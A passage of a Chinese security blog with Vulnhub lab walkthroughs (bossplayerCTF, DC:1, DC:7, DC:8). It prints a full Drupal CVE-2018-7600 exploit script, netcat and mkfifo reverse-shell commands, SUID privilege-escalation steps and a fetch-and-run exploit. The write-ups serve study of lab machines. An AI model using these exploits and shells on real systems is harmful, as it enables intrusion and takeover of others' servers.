<p>提取部分就不会了</p>
<p><img src="/.com//7.png" alt="image-20200214000507561"></p>
<p>这个脚本，估计是运行完就可以用的，但是下载不了</p>
<p>网上有大佬把它敲了出来</p>
<p><img src="/.com//8.png" alt="image-20200214000635077"></p>
<h1 id="pumpkinRaise渗透测试"><a href="#pumpkinRaise渗透测试" class="headerlink" title="pumpkinRaise渗透测试"></a>pumpkinRaise渗透测试</h1><p>这个靶机都什么鬼，完全都是杂项的东西。</p>
<p>没有做完缺工具，然后看了看别的师傅的workthrough</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶机做的稀里糊涂的。然后学到了信息收集nmap的新知识。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/pumpkinGarden-Raise-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5k6001akou52hinck4x" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-DC1-bossplayer-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/DC1-bossplayer-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-25T13:59:18.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/25/DC1-bossplayer-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC1&amp;&amp;bossplayer-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>bossplayerCTF-vulnhub&amp;&amp;DC:1-vulnhub渗透测试</p>
<p>渗透过程思路比较简单，所以就一起写。</p>
<h1 id="bossplayerCTF-vulnhub"><a href="#bossplayerCTF-vulnhub" class="headerlink" title="bossplayerCTF-vulnhub"></a>bossplayerCTF-vulnhub</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>靶机IP:192.168.1.168</p>
<p>KaLiIP:192.168.1.124</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>nmap扫描端口</p>
<p><img src="/.com//1.png" alt="image-20200225211305509"></p>
<p>先访问80端口</p>
<p><img src="/.com//2.png" alt="image-20200225211534738"></p>
<p>在源码中看到</p>
<p><img src="/.com//3.png" alt="image-20200225211610389"></p>
<p>解码后得到<code>workinginprogress.php</code></p>
<p><img src="/.com//4.png" alt="image-20200225211800034"></p>
<p>这里就猜测这里可以执行命令的</p>
<p><img src="/.com//5.png" alt="image-20200225211939963"></p>
<p>访问<code>robots.txt</code></p>
<p><img src="/.com//6.png" alt="image-20200225212032328"></p>
<p>解码可得：<code>lol try harder bro</code></p>
<p>感觉是个无用信息</p>
<p>刚才的那个，我们可以用于反弹shell</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=nc+-e+/bin/sh+192.168.1.124+1234</span><br></pre></td></tr></table></figure>

<p><img src="/.com//7.png" alt="image-20200225212935401"></p>
<p>然后<code>find</code>提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &#x2F;bin&#x2F;sh -p \; -quit</span><br></pre></td></tr></table></figure>

<p><img src="/.com//8.png" alt="image-20200225213154320"></p>
<h1 id="DC-1-vulnhub"><a href="#DC-1-vulnhub" class="headerlink" title="DC:1-vulnhub"></a>DC:1-vulnhub</h1><h2 id="写在前面-1"><a href="#写在前面-1" class="headerlink" title="写在前面"></a>写在前面</h2><p>靶机IP:192.168.1.166</p>
<p>KaLiIP:192.168.1.124</p>
<h2 id="渗透过程-1"><a href="#渗透过程-1" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>扫描端口</p>
<p><img src="/.com//9.png" alt="image-20200225214404128"></p>
<p>drupal7，我们尝试CVE-2018-7600可否使用。</p>
<p>扫描工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'###################################'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'### POC for drupal CVE-2018-7600'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'###################################'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">check_host=&#123;</span><br><span class="line">    <span class="string">'http://192.168.1.166'</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> check_host:</span><br><span class="line">    <span class="keyword">if</span> host[<span class="number">-1</span>::] != <span class="string">'/'</span>:</span><br><span class="line">        host += <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#checking drupal7</span></span><br><span class="line">    print(<span class="string">'\n'</span>+<span class="string">'checking host: '</span>+ host)</span><br><span class="line">    print(<span class="string">'checking drupal 7.x ......'</span>)</span><br><span class="line"></span><br><span class="line">    url = host+<span class="string">'?q=user/password&amp;name[%23post_render][]=system&amp;name[%23markup]=echo%20pwn!!!&amp;name[%23type]=markup'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'form_id'</span>:<span class="string">'user_pass'</span>,</span><br><span class="line">        <span class="string">'_triggering_element_name'</span>:<span class="string">'name'</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,data = data,verify = <span class="literal">False</span>,timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    result = re.search(<span class="string">r'&lt;input type="hidden" name="form_build_id" value="([^"]+)" /&gt;'</span>, r.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        found = result.group(<span class="number">1</span>)</span><br><span class="line">        url = host + <span class="string">'?q=file/ajax/name/%23value/'</span>+found</span><br><span class="line">        data = &#123;<span class="string">'form_build_id'</span> : found&#125;</span><br><span class="line">        r = requests.post(url,data = data,verify = <span class="literal">False</span>,timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'pwn'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">'pwn!!!'</span>+<span class="string">'\n'</span>+host)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'fail'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'fail'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#checking drupal8</span></span><br><span class="line">    print(<span class="string">'\n'</span>+<span class="string">'checking drupal 8.x ......'</span>)</span><br><span class="line">    payload = &#123;</span><br><span class="line">    <span class="string">'mail[a][#lazy_builder][0]'</span>:(<span class="literal">None</span>,<span class="string">'system'</span>),</span><br><span class="line">    <span class="string">'mail[a][#lazy_builder][1][]'</span>:(<span class="literal">None</span>,<span class="string">'echo pwn!!!'</span>),</span><br><span class="line">    <span class="string">'form_id'</span>:(<span class="literal">None</span>,<span class="string">'user_register_form'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>&#125;</span><br><span class="line"></span><br><span class="line">    url = host+<span class="string">'user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span>    </span><br><span class="line">    r = requests.post(url,files = payload, headers = headers,verify = <span class="literal">False</span>,timeout = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>  <span class="string">'pwn'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">'pwn!!!'</span>+<span class="string">'\n'</span>+host)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'fail'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//10.png" alt="image-20200225214715082"></p>
<p>然后使用exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_args</span><span class="params">()</span>:</span></span><br><span class="line">  parser = argparse.ArgumentParser( prog=<span class="string">"drupa7-CVE-2018-7600.py"</span>,</span><br><span class="line">                    formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                    epilog= <span class="string">'''</span></span><br><span class="line"><span class="string">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span></span><br><span class="line"><span class="string">                    by poisoning the recover password form (user/password) and triggering it with</span></span><br><span class="line"><span class="string">                    the upload file via ajax (/file/ajax).</span></span><br><span class="line"><span class="string">                    '''</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"target"</span>, help=<span class="string">"URL of target Drupal site (ex: http://target.com/)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, default=<span class="string">"id"</span>, help=<span class="string">"Command to execute (default = id)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-f"</span>, <span class="string">"--function"</span>, default=<span class="string">"passthru"</span>, help=<span class="string">"Function to use as attack vector (default = passthru)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-p"</span>, <span class="string">"--proxy"</span>, default=<span class="string">""</span>, help=<span class="string">"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)"</span>)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn_target</span><span class="params">(target, function, command, proxy)</span>:</span></span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;<span class="string">'http'</span>: proxy, <span class="string">'https'</span>: proxy&#125;</span><br><span class="line">  print(<span class="string">'[*] Poisoning a form and including it in cache.'</span>)</span><br><span class="line">  get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/password'</span>, <span class="string">'name[#post_render][]'</span>:function, <span class="string">'name[#type]'</span>:<span class="string">'markup'</span>, <span class="string">'name[#markup]'</span>: command&#125;</span><br><span class="line">  post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_pass'</span>, <span class="string">'_triggering_element_name'</span>:<span class="string">'name'</span>, <span class="string">'_triggering_element_value'</span>:<span class="string">''</span>, <span class="string">'opz'</span>:<span class="string">'E-mail new Password'</span>&#125;</span><br><span class="line">  r = requests.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    form = soup.find(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-pass'</span>&#125;)</span><br><span class="line">    form_build_id = form.find(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_build_id'</span>&#125;).get(<span class="string">'value'</span>)</span><br><span class="line">    <span class="keyword">if</span> form_build_id:</span><br><span class="line">        print(<span class="string">'[*] Poisoned form ID: '</span> + form_build_id)</span><br><span class="line">        print(<span class="string">'[*] Triggering exploit to execute: '</span> + command)</span><br><span class="line">        get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/name/#value/'</span> + form_build_id&#125;</span><br><span class="line">        post_params = &#123;<span class="string">'form_build_id'</span>:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">        parsed_result = r.text.split(<span class="string">'[&#123;"command":"settings"'</span>)[<span class="number">0</span>]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"ERROR: Something went wrong."</span>)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> ()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'============================================================================='</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |'</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'|                              by pimps                                     |'</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'=============================================================================\n'</span>)</span><br><span class="line"></span><br><span class="line">  args = get_args() <span class="comment"># get the cl args</span></span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p><img src="/.com//11.png" alt="image-20200225214831475"></p>
<p><img src="/.com//12.png" alt="image-20200225214904577"></p>
<p>成功getshell,然后提权</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty; pty.spawn('/bin/bash')"</span><br><span class="line">find -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/.com//13.png" alt="image-20200225215051632"></p>
<p><code>find可提权</code>，然后<code>exim</code>可提取</p>
<p>这里只讲思路了。就不重复了</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>DC:1是第一个独立做出来的靶机，虽然很简单……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/DC1-bossplayer-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5hs0008kou541f1fcu3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-DC7-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/DC7-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-25T13:58:50.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/25/DC7-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC7-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机渗透DC:7-vulnhub</p>
<p>靶机IP：192.168.0.106</p>
<p>KALIIP:192.168.0.9</p>
<p>师傅告诉我说，做靶机渗透要把想到的，感觉可行的都去尝试，然后要去把握整体思路，最后不要着急，慢慢来。</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>扫描端口</p>
<p><img src="/.com//1.png" alt="image-20200219203626628"></p>
<p>这里有个ssh端口，还有一个80端口</p>
<p>ssh端口的话，应该是要获取到一个用户。渗透测试，发散性思维。</p>
<p>80端口先看着</p>
<p><img src="/.com//2.png" alt="image-20200219215006741"></p>
<p>可以想到，前台没有什么可用信息，估计又是通过后台上传shell，然后反弹shell，再做提权处理。</p>
<p>现在的问题就是缺一个能登录后台的账号密码。</p>
<p>在这个页面底下有一个</p>
<p><img src="/.com//3.png" alt="image-20200219215710377"></p>
<p>靶机是有给提示的，就是不要局限于靶机之内，所以google搜一下<code>@DC7USER</code></p>
<p><img src="/.com//4.png" alt="image-20200219220655699"></p>
<p><img src="/.com//5.png" alt="image-20200219220758885"></p>
<p>这里提供一个mysql的配置文件，我尝试过远程登录mysql，发现不可以的。</p>
<p>然后看看能否有<strong>撞库</strong>存在，先前的ssh端口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username = <span class="string">"dc7user"</span>;</span><br><span class="line">$password = <span class="string">"MdR3xOgB7#dW"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//6.png" alt="image-20200219221201566"></p>
<p>我想它这里提供一个用户是因为能由ssh登录，去重置<code>admin</code>用户的密码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行 drush user-password someuser --password="password" 命令重设用户密码。</span><br></pre></td></tr></table></figure>

<p>并且看到<code>html</code>文件是一个可读可写的文件夹</p>
<p><img src="/.com//8.png" alt="image-20200219222123398"></p>
<p>参考：<a href="https://zhidao.baidu.com/question/265508425.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/265508425.html</a></p>
<p>所以我们可以在这里执行重置admin密码的操作</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=<span class="string">"123456"</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//9.png" alt="image-20200219222123398"></p>
<p>这样子就可以登录到后台，通过修改模块，或者插件漏洞写入webshell.</p>
<p><img src="/.com//10.png" alt="image-20200219222902844"></p>
<p>接着通过这个账号，找找有没有哪里可以修改模块之类的。</p>
<p>content板块进入</p>
<p><img src="/.com//11.png" alt="image-20200219230355542"></p>
<p>这个basic page是可以修改的</p>
<p>但是是没有php模块的</p>
<p><img src="/.com//12.png" alt="image-20200219234837584"></p>
<p>安装一个php模块</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/.com//13.png" alt="image-20200219235101349"></p>
<p><img src="/.com//14.png" alt="image-20200219235131419"></p>
<p>可行</p>
<p><img src="/.com//15.png" alt="image-20200219235321174"></p>
<p><img src="/.com//16.png" alt="image-20200219235339403"></p>
<p>然后写入shell，下载地址:<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">pentestmonkey</a></p>
<p><img src="/.com//17.png" alt="image-20200220000854400"></p>
<p><img src="/.com//18.png" alt="image-20200220001053549"></p>
<p>看到有一封邮件</p>
<p><img src="/.com//20.png" alt="image-20200220001209869"></p>
<p>发现www-data对这个文件有可执行权限.但是它的所有者是root.</p>
<p><img src="/.com//21.png" alt="image-20200220001402803"></p>
<p>通过www-data修改bakups.sh</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.0.9 7777 &gt;/tmp/f"</span> &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/.com//22.png" alt="image-20200220001806908"></p>
<p>最后getshell</p>
<p><img src="/.com//23.png" alt="image-20200220003142978"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前言的那段话，再来一遍。多尝试，然后耐心。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/DC7-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5hv0009kou57063bqu1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-DC8-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/DC8-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-25T13:58:45.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/25/DC8-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC8-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DC:8-vulnhub渗透测试</p>
<p>靶机IP:192.168.0.13</p>
<p>KALIIP:192.168.0.9</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>nmap 扫描</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -sV -Pn -vv <span class="number">192.168</span><span class="number">.0</span><span class="number">.13</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//1.png" alt="image-20200216001149500"></p>
<p>访问80端口的时候，发现这里有一条路由是长这样的.</p>
<p><img src="/.com//2.png" alt="image-20200216002831091"></p>
<p>sqlmap跑一下，这里是有sql注入的。</p>
<p><img src="/.com//3.png" alt="image-20200216003149994"></p>
<p>然后一路跑库，然后里面的数据，暂时没有发现有什么用</p>
<p>当时nmap扫出的一些东西，看看有什么用，发现没什么用。</p>
<p><img src="/.com//4.png" alt="image-20200216170324615"></p>
<p> dirb跑出这里有一<code>user</code>目录</p>
<p><img src="/.com//5.png" alt="image-20200216175445428"></p>
<p>这里需要账号密码，然后之前跑库跑出了一个</p>
<p><img src="/.com//6.png" alt="image-20200216192147838"></p>
<p>然后爆破一下，得到<code>john:turtle</code></p>
<p><img src="/.com//7.png" alt="image-20200216192233998"></p>
<p>然后到主页</p>
<p><img src="/.com//8.png" alt="image-20200216200820145"></p>
<p><img src="/.com//9.png" alt="image-20200216200853044"></p>
<p><img src="/.com//10.png" alt="image-20200216200950108"></p>
<p>然后这个页面用于反弹shell</p>
<p><img src="/.com//11.png" alt="image-20200216201504301"></p>
<p>kali监听4567端口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">4567</span></span><br></pre></td></tr></table></figure>



<p>然后我们访问</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.0.13/node/3</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//12.png" alt="image-20200216201648793"></p>
<p>submit一下,获得shell</p>
<p>获得tty</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty; pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>



<p><strong>重点——————————-新知识</strong></p>
<p>查看哪些命令是有suid权限</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//13.png" alt="image-20200216202221467"></p>
<p>查看版本</p>
<p><img src="/.com//14.png" alt="image-20200216202422549"></p>
<p><img src="/.com//15.png" alt="image-20200216203612773"></p>
<p>下载这个sh文件，然后记得用<code>dos2unix</code>转码sh文件</p>
<p>然后靶机中下载该sh文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd tmp</span><br><span class="line">wget http:<span class="comment">//192.168.0.9/getshell.sh</span></span><br><span class="line">./getshell.sh -m netcat</span><br></pre></td></tr></table></figure>

<p><img src="/.com//16.png" alt="image-20200216205249965"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对Linux的命令不够熟悉，在使用sh的exp之前记得先用<code>dos2unix</code>转换</p>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/ftl1012/p/9249279.html" target="_blank" rel="noopener">https://www.cnblogs.com/ftl1012/p/9249279.html</a></p>
<p><a href="https://www.cnblogs.com/MartinChentf/p/6056571.html" target="_blank" rel="noopener">https://www.cnblogs.com/MartinChentf/p/6056571.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/DC8-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5hx000akou5009th3ms" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
